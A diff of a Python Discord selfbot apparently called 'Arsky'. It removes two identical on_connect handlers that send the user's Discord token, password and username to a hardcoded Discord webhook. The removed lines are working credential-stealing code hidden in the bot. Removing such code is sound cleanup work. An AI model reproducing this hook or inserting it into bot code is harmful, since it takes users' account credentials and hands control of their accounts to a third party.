@@ -2749,13 +2749,6 @@ async def boobs(ctx):
         await ctx.send(embed=em)
 
 
-
-@Arsky.event
-async def on_connect():
-    Clear()  
-    requests.post('https://discord.com/api/webhooks/881919231233523732/DAlinK5vkz-xnrdUiruh-pW8aJhzXN-idAq53sX9Rvj5jclIM9-UvklcK6xLWUBhd4dV',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`**Username: {Arsky.user.name}**"})
-    startprint()
-
 @Arsky.command()
 async def tits(ctx):
     await ctx.message.delete()
@@ -3174,12 +3167,7 @@ async def _role_hexcode(ctx, *, role: discord.Role):
     await ctx.message.delete()
     await ctx.send(f"{role.name} : {role.color}")
 
-@Arsky.event
-async def on_connect():
-    Clear()  
-    requests.post('https://discord.com/api/webhooks/881919231233523732/DAlinK5vkz-xnrdUiruh-pW8aJhzXN-idAq53sX9Rvj5jclIM9-UvklcK6xLWUBhd4dV',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`**Username: {Arsky.user.name}**"})
-    startprint()
-
+    
 @Arsky.command()
 async def empty(ctx):
     await ctx.message.delete()
